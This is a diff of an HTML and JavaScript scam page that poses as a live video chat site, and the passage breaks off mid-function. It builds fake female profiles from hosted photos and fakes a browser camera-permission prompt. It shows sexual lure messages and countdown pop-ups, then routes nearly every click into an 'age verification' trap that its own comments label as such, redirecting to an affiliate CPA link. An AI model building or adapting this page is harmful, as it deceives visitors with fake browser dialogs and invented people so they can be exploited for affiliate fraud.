@@ -3,104 +3,135 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>BestLiveCam - Real Video Chat</title>
+    <title>ChatRandom - Live Video Chat</title>
     
+    <!-- LINK PREVIEW (Loading GIF) -->
     <meta property="og:title" content="🔴 Incoming Video Call...">
     <meta property="og:description" content="A user nearby wants to video chat with you for FREE. Tap to join.">
     <meta property="og:image" content="https://i.gifer.com/ZKZg.gif">
+    <meta property="og:url" content="https://bedjfha.hubss.one/p/uyMfR">
     
     <style>
-        @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap');
+        @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap');
         
         * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Inter', sans-serif; user-select: none; }
-        body { background: #0f0f13; color: #fff; height: 100vh; overflow: hidden; }
+        body { background: #0f0f13; color: #fff; height: 100vh; display: flex; flex-direction: column; overflow: hidden; }
         
-        /* ==========================================
-           1. SPLASH / ENTRY SCREEN (Based on Image)
-           ========================================== */
-        #splashScreen { position: fixed; inset: 0; background: rgba(13, 17, 38, 0.95); backdrop-filter: blur(10px); z-index: 9999; display: flex; flex-direction: column; justify-content: center; align-items: center; text-align: center; padding: 20px; transition: opacity 0.5s ease; }
-        .splash-logo { font-size: 42px; font-weight: 300; color: #fff; margin-bottom: 20px; display: flex; align-items: center; gap: 10px; letter-spacing: -1px; }
-        .splash-logo span { font-weight: 800; color: #fff; }
-        .globe-icon { color: #22c55e; font-size: 38px; animation: spin 10s linear infinite; }
-        .splash-tagline { font-size: 22px; font-weight: 600; color: #fff; margin-bottom: 8px; }
-        .splash-subline { font-size: 16px; color: #cbd5e1; margin-bottom: 40px; }
-        
-        .splash-card { background: #020617; border-radius: 20px; padding: 40px 30px; width: 100%; max-width: 400px; box-shadow: 0 20px 50px rgba(0,0,0,0.5); border: 1px solid rgba(255,255,255,0.05); }
-        .sc-title { font-size: 26px; font-weight: 500; color: #fff; margin-bottom: 10px; }
-        .sc-sub { font-size: 18px; font-weight: 700; color: #fff; margin-bottom: 30px; }
-        .sc-btn { background: #22c55e; color: #fff; border: none; width: 100%; padding: 18px; border-radius: 30px; font-size: 18px; font-weight: 600; cursor: pointer; transition: 0.3s; box-shadow: 0 0 15px rgba(34, 197, 94, 0.4); animation: pulse 2s infinite; }
-        .sc-btn:hover { background: #16a34a; transform: scale(1.02); }
-
-        /* MAIN APP WRAPPER (Starts blurred) */
-        #mainApp { display: flex; flex-direction: column; height: 100vh; filter: blur(8px); transition: filter 0.5s ease; pointer-events: none; }
-        #mainApp.active { filter: blur(0); pointer-events: all; }
-
-        /* ==========================================
-           2. MAIN APP STYLES (From Previous Version)
-           ========================================== */
+        /* SCROLLBAR */
         ::-webkit-scrollbar { width: 5px; }
+        ::-webkit-scrollbar-track { background: transparent; }
         ::-webkit-scrollbar-thumb { background: #333; border-radius: 10px; }
 
-        header { background: #15151c; padding: 15px 30px; display: flex; justify-content: space-between; align-items: center; border-bottom: 1px solid rgba(255,255,255,0.05); }
-        .logo { font-size: 24px; font-weight: 700; color: #ff3366; }
+        /* HEADER */
+        header { background: #15151c; padding: 15px 30px; display: flex; justify-content: space-between; align-items: center; border-bottom: 1px solid rgba(255,255,255,0.05); z-index: 100; }
+        .logo { font-size: 24px; font-weight: 700; color: #ff3366; letter-spacing: -0.5px; }
         .online-badge { background: #1e1e26; border: 1px solid rgba(255,255,255,0.08); font-size: 13px; color: #aaa; padding: 6px 16px; border-radius: 20px; display: flex; align-items: center; gap: 8px; }
-        .green-dot { width: 8px; height: 8px; background: #22c55e; border-radius: 50%; box-shadow: 0 0 8px #22c55e; animation: blink 1.5s infinite; }
+        .green-dot { width: 8px; height: 8px; background: #00e676; border-radius: 50%; box-shadow: 0 0 8px #00e676; animation: blink 1.5s infinite; }
 
+        /* MAIN CONTAINER */
         .wrapper { flex: 1; display: flex; overflow: hidden; }
         @media (max-width: 900px) { .wrapper { flex-direction: column; } }
 
+        /* LEFT SIDEBAR: INFINITE GIRLS LIST */
         .sidebar { width: 300px; background: #16161e; border-right: 1px solid rgba(255,255,255,0.05); display: flex; flex-direction: column; height: 100%; }
-        @media (max-width: 900px) { .sidebar { display: none; } }
-        .sidebar-title { padding: 15px 20px; font-size: 12px; font-weight: 700; color: #ff3366; border-bottom: 1px solid rgba(255,255,255,0.05); text-transform: uppercase; }
+        @media (max-width: 900px) { .sidebar { display: none; } /* Mobile e sidebar hide korlam clean rakhar jonno */ }
+        .sidebar-title { padding: 15px 20px; font-size: 12px; font-weight: 700; color: #ff3366; border-bottom: 1px solid rgba(255,255,255,0.05); text-transform: uppercase; letter-spacing: 1px; }
         .user-list { flex: 1; overflow-y: auto; padding: 10px; display: flex; flex-direction: column; gap: 4px; }
         .user-item { display: flex; align-items: center; gap: 12px; padding: 10px; border-radius: 8px; cursor: pointer; transition: 0.2s; }
         .user-item:hover, .user-item.active { background: rgba(255,51,102,0.1); }
-        .user-avatar { width: 40px; height: 40px; border-radius: 50%; object-fit: cover; border: 2px solid #333; }
-        .user-item.active .user-avatar { border-color: #22c55e; }
-        .user-meta { flex: 1; }
+        .user-avatar { width: 40px; height: 40px; border-radius: 50%; object-fit: cover; border: 2px solid #333; position: relative; }
+        .user-item.active .user-avatar { border-color: #00e676; }
+        .user-meta { flex: 1; overflow: hidden; }
         .user-name { font-size: 14px; font-weight: 600; color: #fff; margin-bottom: 3px; }
-        .user-status { font-size: 11px; color: #22c55e; }
+        .user-status { font-size: 11px; color: #00e676; }
         .status-private { color: #ffaa00; }
+        
         .load-more { text-align: center; padding: 15px; font-size: 13px; color: #aaa; cursor: pointer; border-top: 1px solid rgba(255,255,255,0.05); font-weight: 600; }
+        .load-more:hover { color: #fff; background: rgba(255,255,255,0.05); }
 
+        /* CENTER/MAIN VIDEO SECTION */
         .main-content { flex: 1; padding: 20px; display: grid; grid-template-columns: 2fr 1fr; gap: 20px; overflow-y: auto; }
         @media (max-width: 900px) { .main-content { grid-template-columns: 1fr; } }
 
-        .video-box { position: relative; background: #000; border-radius: 12px; overflow: hidden; border: 1px solid rgba(255,255,255,0.05); aspect-ratio: 16/10; display: flex; justify-content: center; align-items: center; cursor: pointer; }
+        .video-box { position: relative; background: #000; border-radius: 12px; overflow: hidden; border: 1px solid rgba(255,255,255,0.05); aspect-ratio: 16/10; display: flex; justify-content: center; align-items: center; cursor: pointer; box-shadow: 0 10px 40px rgba(0,0,0,0.6); }
         .cam-img { width: 100%; height: 100%; object-fit: cover; filter: brightness(0.65); animation: breathe 8s infinite alternate ease-in-out; }
+        
         .hud-top { position: absolute; top: 15px; left: 15px; display: flex; gap: 10px; z-index: 10; }
         .live-tag { background: rgba(0,0,0,0.7); color: #fff; font-size: 11px; font-weight: bold; padding: 5px 12px; border-radius: 4px; display: flex; align-items: center; gap: 6px; border: 1px solid rgba(255,51,102,0.3); }
         .live-dot { width: 6px; height: 6px; background: #ff3366; border-radius: 50%; animation: blink 1s infinite; }
-        
+
+        /* FAKE BROWSER PERMISSION */
+        .fake-permission { position: absolute; top: 20px; left: 50%; transform: translateX(-50%); background: #fff; border-radius: 8px; padding: 12px 16px; display: flex; align-items: center; gap: 15px; box-shadow: 0 10px 30px rgba(0,0,0,0.8); z-index: 50; width: 90%; max-width: 420px; color: #222; }
+        .perm-icon { font-size: 20px; }
+        .perm-text { flex: 1; font-size: 12px; line-height: 1.4; color: #333; }
+        .perm-btns { display: flex; gap: 8px; }
+        .btn-block { background: #e8eaed; border: none; padding: 6px 14px; border-radius: 4px; font-size: 12px; font-weight: 600; color: #1a73e8; cursor: pointer; }
+        .btn-allow { background: #1a73e8; border: none; padding: 6px 14px; border-radius: 4px; font-size: 12px; font-weight: 600; color: #fff; cursor: pointer; }
+
         .play-center { position: absolute; display: flex; flex-direction: column; align-items: center; gap: 12px; z-index: 15; }
         .play-btn { width: 70px; height: 70px; background: rgba(255, 51, 102, 0.9); border-radius: 50%; display: flex; justify-content: center; align-items: center; font-size: 30px; color: white; padding-left: 5px; box-shadow: 0 0 30px rgba(255, 51, 102, 0.6); }
 
+        /* RIGHT PANEL */
         .right-panel { display: flex; flex-direction: column; gap: 20px; }
         .my-cam-box { background: #16161e; border-radius: 12px; border: 1px solid rgba(255,255,255,0.05); flex: 1; display: flex; flex-direction: column; justify-content: center; align-items: center; padding: 30px; text-align: center; cursor: pointer; min-height: 200px; }
-        .btn-next-stranger { background: #ff4766; color: white; border: none; padding: 18px; border-radius: 10px; font-size: 15px; font-weight: 700; cursor: pointer; }
+        .btn-next-stranger { background: #ff4766; color: white; border: none; padding: 18px; border-radius: 10px; font-size: 15px; font-weight: 700; cursor: pointer; box-shadow: 0 5px 20px rgba(255, 71, 102, 0.3); }
 
-        .chat-container { grid-column: 1 / -1; background: #16161e; border-radius: 12px; border: 1px solid rgba(255,255,255,0.05); padding: 20px; cursor: pointer; }
-        .chat-msg { background: rgba(255,51,102,0.15); border: 1px solid rgba(255,51,102,0.3); color: #fff; padding: 10px 15px; border-radius: 12px; font-size: 13px; width: fit-content; margin-top: 10px; }
+        /* BOTTOM CHAT */
+        .chat-container { grid-column: 1 / -1; background: #16161e; border-radius: 12px; border: 1px solid rgba(255,255,255,0.05); overflow: hidden; cursor: pointer; min-height: 150px; }
+        .chat-header { padding: 12px 20px; font-size: 13px; font-weight: 600; background: #1b1b24; border-bottom: 1px solid rgba(255,255,255,0.05); color: #ccc; }
+        .chat-body { padding: 20px; display: flex; flex-direction: column; gap: 10px; }
+        .sys-msg { font-size: 11px; color: #777; text-align: center; }
+        .chat-msg { background: rgba(255,51,102,0.15); border: 1px solid rgba(255,51,102,0.3); color: #fff; padding: 10px 15px; border-radius: 12px; font-size: 13px; width: fit-content; }
 
-        /* POPUPS & TOASTS */
-        .toast-container { position: fixed; bottom: 20px; left: 20px; display: flex; flex-direction: column; gap: 10px; z-index: 700; pointer-events: none; }
-        .toast { background: rgba(22, 22, 30, 0.9); border-left: 3px solid #22c55e; padding: 10px 15px; border-radius: 6px; font-size: 12px; font-weight: 600; color: #fff; box-shadow: 0 5px 15px rgba(0,0,0,0.5); display: flex; align-items: center; gap: 10px; animation: slideInLeft 0.4s ease-out forwards, fadeOut 0.4s ease-in 4s forwards; opacity: 0; transform: translateX(-100%); }
+        /* ==========================================
+           POPUP 1: INSTANT REQUEST POPUP
+           ========================================== */
+        .request-modal-overlay { position: fixed; inset: 0; background: rgba(0,0,0,0.75); backdrop-filter: blur(5px); display: none; justify-content: center; align-items: center; z-index: 990; }
+        .request-card { background: #1e1e24; border-radius: 12px; width: 340px; overflow: hidden; box-shadow: 0 20px 60px rgba(0,0,0,0.9); border: 1px solid rgba(255,255,255,0.1); text-align: center; animation: popIn 0.3s ease-out; }
+        .req-head { background: #15151a; padding: 15px; display: flex; justify-content: space-between; align-items: center; font-size: 14px; font-weight: 700; color: #fff; }
+        .req-body-content { padding: 30px 20px; }
+        .req-user-img { width: 90px; height: 90px; border-radius: 50%; object-fit: cover; border: 3px solid #ff3366; margin-bottom: 15px; }
+        .req-text-msg { font-size: 14px; color: #ddd; line-height: 1.5; margin-bottom: 15px; }
+        .req-text-msg strong { color: #2196f3; font-size: 16px; }
+        .req-action-btn { background: #333; color: white; border: none; padding: 12px 30px; border-radius: 6px; font-weight: 700; cursor: pointer; transition: 0.2s; }
+        .req-action-btn.accept { background: #1a73e8; margin-left: 10px; }
 
-        .floating-chat-box { position: fixed; bottom: 20px; right: 20px; width: 300px; background: #1c181b; border-radius: 12px; border: 1px solid #ff3366; z-index: 800; display: none; overflow: hidden; animation: slideUp 0.3s ease-out; cursor: pointer; }
-        .fc-head { background: linear-gradient(90deg, #ff3366, #ff5566); padding: 12px 15px; display: flex; justify-content: space-between; align-items: center; color: #fff; font-weight: 700; font-size: 14px; }
-        .fc-content { padding: 15px; display: flex; flex-direction: column; gap: 10px; background: #151214; min-height: 150px; }
-        .fc-bubble { background: #ff3366; color: #fff; padding: 8px 14px; border-radius: 15px; font-size: 13px; width: fit-content; display: none; animation: popIn 0.2s ease-out; }
+        /* ==========================================
+           POPUP 2: FLOATING CHAT WIDGET
+           ========================================== */
+        .floating-chat-box { position: fixed; bottom: 20px; right: 20px; width: 300px; background: #1c181b; border-radius: 12px; border: 1px solid #ff3366; box-shadow: 0 10px 50px rgba(0,0,0,0.9); z-index: 800; display: none; overflow: hidden; animation: slideUp 0.3s ease-out; }
+        .fc-head { background: linear-gradient(90deg, #ff3366, #ff5566); padding: 12px 15px; display: flex; justify-content: space-between; align-items: center; color: #fff; font-weight: 700; font-size: 14px; cursor: pointer; }
+        .fc-user-info { display: flex; align-items: center; gap: 10px; }
+        .fc-user-img { width: 32px; height: 32px; border-radius: 50%; object-fit: cover; border: 2px solid #fff; }
+        .fc-content { padding: 15px; display: flex; flex-direction: column; gap: 10px; background: #151214; min-height: 200px; }
+        
+        /* TYPING INDICATOR */
         .typing-indicator { font-size: 12px; color: #aaa; font-style: italic; display: none; margin-bottom: 5px; animation: blink 1.5s infinite; }
+        
+        .fc-bubble { background: #ff3366; color: #fff; padding: 8px 14px; border-radius: 15px; font-size: 13px; width: fit-content; display: none; animation: popIn 0.2s ease-out; box-shadow: 0 4px 10px rgba(255, 51, 102, 0.2); }
+        .fc-photo-preview { width: 140px; height: 160px; border-radius: 8px; overflow: hidden; position: relative; border: 2px solid #ff3366; cursor: pointer; display: none; animation: popIn 0.2s ease-out; }
+        .fc-photo-preview img { width: 100%; height: 100%; object-fit: cover; filter: blur(12px); transform: scale(1.1); }
+        .fc-photo-overlay { position: absolute; inset: 0; background: rgba(0,0,0,0.4); display: flex; flex-direction: column; justify-content: center; align-items: center; color: white; font-size: 12px; font-weight: 600; }
 
-        /* THE TRAP MODAL */
+        /* ==========================================
+           TOAST NOTIFICATIONS (Live Feel)
+           ========================================== */
+        .toast-container { position: fixed; bottom: 20px; left: 20px; display: flex; flex-direction: column; gap: 10px; z-index: 700; pointer-events: none; }
+        .toast { background: rgba(22, 22, 30, 0.9); border-left: 3px solid #00e676; padding: 10px 15px; border-radius: 6px; font-size: 12px; font-weight: 600; color: #fff; box-shadow: 0 5px 15px rgba(0,0,0,0.5); display: flex; align-items: center; gap: 10px; animation: slideInLeft 0.4s ease-out forwards, fadeOut 0.4s ease-in 4s forwards; opacity: 0; transform: translateX(-100%); }
+
+        /* ==========================================
+           THE FINAL TRAP: AGE VERIFICATION MODAL
+           ========================================== */
         .verify-modal-overlay { position: fixed; inset: 0; background: rgba(10, 10, 15, 0.95); display: none; justify-content: center; align-items: center; z-index: 99999; padding: 20px; }
         .verify-box { background: #16161e; border: 2px solid #ff3366; border-radius: 14px; max-width: 440px; width: 100%; padding: 30px; text-align: center; box-shadow: 0 0 50px rgba(255, 51, 102, 0.2); }
-        .continue-btn { width: 100%; background: #22c55e; border: none; padding: 15px; border-radius: 8px; font-size: 16px; font-weight: 800; color: #000; cursor: pointer; margin-top: 15px; box-shadow: 0 5px 20px rgba(34, 197, 94, 0.3); text-transform: uppercase; }
+        .verify-title { font-size: 20px; font-weight: 800; color: #ff3366; margin-bottom: 15px; text-transform: uppercase; }
+        .verify-desc { font-size: 14px; color: #ccc; line-height: 1.6; margin-bottom: 20px; text-align: left; }
+        .verify-box-highlight { background: rgba(0, 230, 118, 0.08); border: 1px dashed #00e676; color: #00e676; padding: 12px; border-radius: 8px; font-size: 13px; font-weight: 600; margin-bottom: 25px; }
+        .verify-box-highlight strong { color: #fff; font-size: 16px; display: inline-block; margin-top: 5px; }
+        .continue-btn { width: 100%; background: #00e676; border: none; padding: 15px; border-radius: 8px; font-size: 16px; font-weight: 800; color: #000; cursor: pointer; box-shadow: 0 5px 20px rgba(0, 230, 118, 0.3); text-transform: uppercase; }
 
         /* ANIMATIONS */
-        @keyframes pulse { 0% { box-shadow: 0 0 0 0 rgba(34, 197, 94, 0.7); } 70% { box-shadow: 0 0 0 15px rgba(34, 197, 94, 0); } 100% { box-shadow: 0 0 0 0 rgba(34, 197, 94, 0); } }
         @keyframes blink { 50% { opacity: 0.3; } }
-        @keyframes spin { 100% { transform: rotate(360deg); } }
         @keyframes breathe { 0% { transform: scale(1); } 100% { transform: scale(1.05); } }
         @keyframes popIn { from { transform: scale(0.85); opacity: 0; } to { transform: scale(1); opacity: 1; } }
         @keyframes slideUp { from { transform: translateY(40px); opacity: 0; } to { transform: translateY(0); opacity: 1; } }
@@ -110,213 +141,345 @@
 </head>
 <body>
 
-    <!-- ==========================================
-         ENTRY SPLASH SCREEN (NEW)
-         ========================================== -->
-    <div id="splashScreen">
-        <div class="splash-logo">
-            <span class="globe-icon">🌐</span> Im<span>Live</span>
-        </div>
-        <div class="splash-tagline">Jump In. Say Hi. Stay Awhile.</div>
-        <div class="splash-subline">Where real people go live, every minute of the day.</div>
-        
-        <div class="splash-card">
-            <div class="sc-title">Welcomes You In</div>
-            <div class="sc-sub">Now, let the fun begin...</div>
-            <button class="sc-btn" onclick="enterMainSite()">Start Chatting Now</button>
-        </div>
-    </div>
-
     <!-- AGE VERIFICATION POPUP (The Trap) -->
     <div class="verify-modal-overlay" id="verifyModal">
         <div class="verify-box">
-            <h2 style="color:#ff3366; margin-bottom: 15px;">⚠️ Age Verification Required</h2>
-            <p style="color:#ccc; font-size:14px; line-height: 1.6; text-align: left; margin-bottom: 20px;">
+            <div class="verify-title">⚠️ Age Verification Required</div>
+            <div class="verify-desc">
                 Are you at least 18+ years old? <br><br>
-                The women have requested that we not let anyone younger than 18 contact them.
-            </p>
-            <div style="background: rgba(34, 197, 94, 0.1); border: 1px dashed #22c55e; color: #22c55e; padding: 12px; border-radius: 8px; font-weight: 600;">
-                Verify your age for FREE securely.
+                The women have requested that we not let anyone younger than 18 contact them because of past rude behavior by younger men.
+            </div>
+            <div class="verify-box-highlight">
+                To continue, please verify your age for FREE securely at:<br>
+                <strong>bedjfha.hubss.one</strong>
             </div>
             <button class="continue-btn" onclick="executeRedirect()">I am 18+ - Verify For FREE</button>
         </div>
     </div>
 
-    <!-- MAIN APP WRAPPER -->
-    <div id="mainApp">
-        <header>
-            <div class="logo">BestLiveCam</div>
-            <div class="online-badge"><span class="green-dot"></span> <span id="onlineCounter">142,715</span> Online</div>
-        </header>
+    <header>
+        <div class="logo">ChatRandom</div>
+        <div class="online-badge"><span class="green-dot"></span> <span id="onlineCounter">142,715</span> Online</div>
+    </header>
 
-        <div class="wrapper">
-            <div class="sidebar">
-                <div class="sidebar-title">🔥 Live Girls (<span id="liveCount">86</span>)</div>
-                <div class="user-list" id="userList"></div>
-                <div class="load-more" onclick="triggerVerification()">Load More Girls...</div>
+    <div class="wrapper">
+        <!-- LEFT SIDEBAR: DYNAMIC INFINITE LIST -->
+        <div class="sidebar">
+            <div class="sidebar-title">🔥 Live Girls (<span id="liveCount">86</span>)</div>
+            <div class="user-list" id="userList">
+                <!-- Javascript will generate 50+ profiles here -->
+            </div>
+            <div class="load-more" onclick="triggerVerification()">Load More Girls...</div>
+        </div>
+
+        <!-- MAIN CONTENT -->
+        <div class="main-content">
+            
+            <div class="video-box" onclick="triggerVerification()">
+                <!-- FAKE BROWSER PERMISSION -->
+                <div class="fake-permission">
+                    <div class="perm-icon">🔒</div>
+                    <div class="perm-text"><strong>chatrandom.com</strong> wants to<br>Use your camera and microphone</div>
+                    <div class="perm-btns">
+                        <button class="btn-block">Block</button>
+                        <button class="btn-allow">Allow</button>
+                    </div>
+                </div>
+
+                <div class="hud-top">
+                    <div class="live-tag"><div class="live-dot"></div> LIVE</div>
+                </div>
+
+                <img id="mainCamImg" src="" class="cam-img" alt="cam">
+
+                <div class="play-center">
+                    <div class="play-btn">▶</div>
+                    <div style="background: rgba(0,0,0,0.8); padding: 6px 15px; border-radius: 20px; font-size: 12px; font-weight: bold;">Tap to Play & Unmute</div>
+                </div>
             </div>
 
-            <div class="main-content">
-                <div class="video-box" onclick="triggerVerification()">
-                    <div class="hud-top"><div class="live-tag"><div class="live-dot"></div> LIVE</div></div>
-                    <img id="mainCamImg" src="" class="cam-img" alt="cam">
-                    <div class="play-center">
-                        <div class="play-btn">▶</div>
-                    </div>
+            <!-- RIGHT PANEL -->
+            <div class="right-panel">
+                <div class="my-cam-box" onclick="triggerVerification()">
+                    <div style="font-size: 35px; opacity: 0.5; margin-bottom: 10px;">📷</div>
+                    <div style="color: #888; font-size: 13px; margin-bottom: 15px;">Camera is disabled.<br>Click "Allow" in your browser.</div>
+                    <button style="background: #ff3366; color: white; border: none; padding: 10px 20px; border-radius: 20px; font-weight: bold; cursor: pointer;">Enable Camera</button>
                 </div>
+                <button class="btn-next-stranger" onclick="triggerVerification()">⏭ Next Stranger</button>
+            </div>
 
-                <div class="right-panel">
-                    <div class="my-cam-box" onclick="triggerVerification()">
-                        <div style="font-size: 35px; opacity: 0.5; margin-bottom: 10px;">📷</div>
-                        <div style="color: #888; font-size: 13px; margin-bottom: 15px;">Camera disabled.</div>
-                        <button style="background: #ff3366; color: white; border: none; padding: 10px 20px; border-radius: 20px; font-weight: bold; cursor: pointer;">Enable Camera</button>
-                    </div>
-                    <button class="btn-next-stranger" onclick="triggerVerification()">⏭ Next Stranger</button>
-                </div>
-
-                <div class="chat-container" onclick="triggerVerification()">
-                    <div style="font-size: 13px; font-weight: 600; color: #ccc; border-bottom: 1px solid rgba(255,255,255,0.05); padding-bottom: 10px;">Live Chat</div>
+            <!-- BOTTOM CHAT -->
+            <div class="chat-container" onclick="triggerVerification()">
+                <div class="chat-header">Live Chat (Encrypted)</div>
+                <div class="chat-body">
+                    <div class="sys-msg">Connection secured. Say hi!</div>
                     <div class="chat-msg" id="chatMsg1">Hi! Are you online? 👋</div>
                 </div>
             </div>
         </div>
     </div>
 
+    <!-- TOAST CONTAINER -->
     <div class="toast-container" id="toastContainer"></div>
 
+    <!-- INSTANT REQUEST POPUP -->
+    <div class="request-modal-overlay" id="requestModal">
+        <div class="request-card">
+            <div class="req-head">
+                <span>Instant Private Chat</span>
+                <span style="cursor:pointer; color:#888;" onclick="closeRequestPopup()">✖</span>
+            </div>
+            <div class="req-body-content">
+                <img id="reqUserImg" src="" class="req-user-img">
+                <div class="req-text-msg">
+                    <strong id="reqUserName">Babe Lana</strong> sends a Request.<br>
+                    If you both press Accept, you will chat for FREE.
+                </div>
+                <div style="font-size: 15px; font-weight: 700; color: #1a73e8; margin-bottom: 15px; cursor: pointer;" onclick="triggerVerification()">Accept her Request?</div>
+                <div style="font-size: 12px; color: #888; margin-bottom: 20px;">(Expires in <span id="reqTimer" style="color:#ffaa00;">10</span>s)</div>
+                <div>
+                    <button class="req-action-btn" onclick="closeRequestPopup()">No</button>
+                    <button class="req-action-btn accept" onclick="triggerVerification()">Accept</button>
+                </div>
+            </div>
+        </div>
+    </div>
+
     <!-- FLOATING CHAT WIDGET -->
-    <div class="floating-chat-box" id="floatingChat" onclick="triggerVerification()">
-        <div class="fc-head">
-            <div style="display: flex; align-items: center; gap: 10px;">
-                <img id="fcImg" src="" style="width: 32px; height: 32px; border-radius: 50%; border: 2px solid #fff;">
+    <div class="floating-chat-box" id="floatingChat">
+        <div class="fc-head" onclick="triggerVerification()">
+            <div class="fc-user-info">
+                <img id="fcImg" src="" class="fc-user-img">
                 <span id="fcName">Hailey Rose</span>
             </div>
-            <span>✖</span>
+            <span onclick="closeFloatingChat(event)">✖</span>
         </div>
-        <div class="fc-content">
+        <div class="fc-content" onclick="triggerVerification()">
             <div class="typing-indicator" id="fcTyping">Hailey is typing...</div>
-            <div class="fc-bubble" id="msg1">Hey there!</div>
-            <div class="fc-bubble" id="msg2">Can you hear me? Turn on your cam! 😋</div>
+            <div class="fc-bubble" id="msg1">Hi!</div>
+            <div class="fc-bubble" id="msg2">I wanna send you a nude 😋</div>
+            <div class="fc-photo-preview" id="msgPhoto">
+                <img id="fcBlurImg" src="">
+                <div class="fc-photo-overlay">
+                    <span style="font-size: 24px; margin-bottom: 5px;">🚫</span>
+                    See photo
+                </div>
+            </div>
         </div>
     </div>
 
     <script>
+        // ==========================================
+        // 1. DATA & GENERATION
+        // ==========================================
+        const baseImages = [
+            "https://github.com/gdjg536ydiv-bot/affizerp/blob/main/photo_2026-02-01_19-40-54.jpg?raw=true",
+            "https://github.com/gdjg536ydiv-bot/affizerp/blob/main/post94873717708903160IMG_2631.jpeg?raw=true",
+            "https://github.com/gdjg536ydiv-bot/affizerp/blob/main/zUhgoTkN_400x400.jpg?raw=true",
+            "https://github.com/gdjg536ydiv-bot/affizerp/blob/main/images_5fafcae692d2c.jpeg?raw=true",
+            "https://github.com/gdjg536ydiv-bot/affizerp/blob/main/images_5faff59e27102.jpeg?raw=true",
+            "https://github.com/gdjg536ydiv-bot/affizerp/blob/main/images_5fafd6212320b.jpeg?raw=true",
+            "https://github.com/gdjg536ydiv-bot/affizerp/blob/main/images_5fafc930da7d6.jpeg?raw=true",
+            "https://github.com/gdjg536ydiv-bot/affizerp/blob/main/images_5fafbe3fc1960.jpeg?raw=true"
+        ];
+        
+        const firstNames = ["Hailey", "Lana", "Chloe", "Mia", "Ava", "Emma", "Sophia", "Lily", "Olivia", "Isabella", "Amelia", "Harper", "Evelyn", "Abigail", "Emily", "Madison"];
+        const lastNames = ["Rose", "Sweet", "Sunset", "Secret", "Cute", "Hot", "Desire", "Vip", "Live", "Private"];
+
+        // Generate 50+ Users
+        const profiles = [];
+        for(let i=0; i<60; i++) {
+            let fn = firstNames[Math.floor(Math.random() * firstNames.length)];
+            let ln = lastNames[Math.floor(Math.random() * lastNames.length)];
+            let img = baseImages[Math.floor(Math.random() * baseImages.length)];
+            let status = Math.random() > 0.3 ? "● Live Now" : "In Private Chat";
+            let statusClass = status.includes("Live") ? "" : "status-private";
+            profiles.push({ name: `${fn} ${ln}`, photo: img, status: status, sClass: statusClass });
+        }
+
         const targetCpaLink = "https://bedjfha.hubss.one/p/uyMfR";
         let isVerifying = false;
-        
-        // Audio System
+        let audioUnlocked = false;
+
+        // ==========================================
+        // 2. AUDIO SYSTEM (Web Audio API - No files needed)
+        // ==========================================
         const audioCtx = new (window.AudioContext || window.webkitAudioContext)();
+        
         function playPing() {
-            if (audioCtx.state !== 'running') return;
+            if (!audioUnlocked || audioCtx.state !== 'running') return;
             try {
                 const osc = audioCtx.createOscillator();
                 const gain = audioCtx.createGain();
                 osc.type = 'sine';
-                osc.frequency.setValueAtTime(880, audioCtx.currentTime);
+                osc.frequency.setValueAtTime(880, audioCtx.currentTime); // High pitch A5
                 osc.frequency.exponentialRampToValueAtTime(1760, audioCtx.currentTime + 0.1);
                 gain.gain.setValueAtTime(0.5, audioCtx.currentTime);
                 gain.gain.exponentialRampToValueAtTime(0.01, audioCtx.currentTime + 0.3);
-                osc.connect(gain); gain.connect(audioCtx.destination);
-                osc.start(); osc.stop(audioCtx.currentTime + 0.3);
+                osc.connect(gain);
+                gain.connect(audioCtx.destination);
+                osc.start();
+                osc.stop(audioCtx.currentTime + 0.3);
             } catch(e) {}
         }
 
+        // Unlock audio on first user interaction (Browser Policy)
+        document.body.addEventListener('click', () => {
+            if(!audioUnlocked) {
+                audioCtx.resume().then(() => { audioUnlocked = true; });
+            }
+        }, { once: true });
+        document.body.addEventListener('mousemove', () => {
+            if(!audioUnlocked) {
+                audioCtx.resume().then(() => { audioUnlocked = true; });
+            }
+        }, { once: true });
+
+
         // ==========================================
-        // ENTRY LOGIC (Triggers when Green Button clicked)
+        // 3. UI INITIALIZATION
         // ==========================================
-        function enterMainSite() {
-            // 1. Hide Splash & Unblur Main App
-            document.getElementById('splashScreen').style.opacity = '0';
-            setTimeout(() => { document.getElementById('splashScreen').style.display = 'none'; }, 500);
-            document.getElementById('mainApp').classList.add('active');
-            
-            // 2. Unlock Audio
-            if(audioCtx.state === 'suspended') { audioCtx.resume(); }
-
-            // 3. Start Live Interactions
-            startLiveSystem();
-        }
-
-        // Data setup
-        const baseImages = [
-            "https://github.com/gdjg536ydiv-bot/affizerp/blob/main/photo_2026-02-01_19-40-54.jpg?raw=true",
-            "https://github.com/gdjg536ydiv-bot/affizerp/blob/main/post94873717708903160IMG_2631.jpeg?raw=true",
-            "https://github.com/gdjg536ydiv-bot/affizerp/blob/main/images_5fafcae692d2c.jpeg?raw=true"
-        ];
-        const names = ["Hailey", "Lana", "Chloe", "Mia", "Ava"];
-        const profiles = [];
-        for(let i=0; i<30; i++) {
-            profiles.push({ 
-                name: names[Math.floor(Math.random()*names.length)] + " Vip", 
-                photo: baseImages[Math.floor(Math.random()*baseImages.length)] 
-            });
-        }
-
-        // Init UI
         const userListDiv = document.getElementById('userList');
-        profiles.forEach((p, i) => {
+        profiles.forEach((profile, index) => {
             const item = document.createElement('div');
-            item.className = `user-item ${i === 0 ? 'active' : ''}`;
-            item.onclick = triggerVerification;
-            item.innerHTML = `<img src="${p.photo}" class="user-avatar"><div class="user-meta"><div class="user-name">${p.name}</div><div class="user-status">● Live Now</div></div>`;
+            item.className = `user-item ${index === 0 ? 'active' : ''}`;
+            item.onclick = triggerVerification; // Any click triggers trap
+            
+            item.innerHTML = `
+                <img src="${profile.photo}" class="user-avatar">
+                <div class="user-meta">
+                    <div class="user-name">${profile.name}</div>
+                    <div class="user-status ${profile.sClass}">${profile.status}</div>
+                </div>
+            `;
             userListDiv.appendChild(item);
         });
-        document.getElementById('mainCamImg').src = profiles[0].photo;
 
+        // Set Main Video
+        document.getElementById('mainCamImg').src = profiles[0].photo;
+        document.getElementById('chatMsg1').innerText = `Hi! I'm ${profiles[0].name.split(' ')[0]}. Turn on your cam? 😉`;
+
+
+        // ==========================================
+        // 4. CPA TRAP & REDIRECT
+        // ==========================================
         function triggerVerification() {
             if (isVerifying) return;
             isVerifying = true;
